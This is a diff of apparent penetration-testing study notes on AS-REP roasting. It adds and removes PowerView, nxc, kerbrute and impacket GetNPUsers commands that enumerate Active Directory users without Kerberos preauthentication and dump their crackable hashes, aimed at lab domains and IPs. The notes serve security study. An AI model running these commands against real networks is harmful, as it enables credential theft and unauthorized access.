@@ -13,18 +13,16 @@ Steps:
 
 ```sh
 
-Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
+#powerview
+Get-DomainUser -PreauthNotRequired -verbose
+
+#nxc
+nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
+
+#impacket 
+GetNPUsers.py -dc-ip 10.129.40.182  -usersfile ./valid -no-pass  EGOTISTICAL-BANK.LOCAL/
 
 
-kerbrute userenum --dc spookysec.local -d spookysec.local users.txt --downgrade
-
-#output hash
-impacket-getnpusers oscp.lab/wade -outputfile bernie.asrep
-
-Impacket-GetNPUsers -dc-ip <ip> -usersfile users.txt 
-<domain_name/domain_user>
-
-#if we are in the domain 
 impacket-getnpusers oscp.lab/wade
 
 # check ASREPRoast for all users in current domain
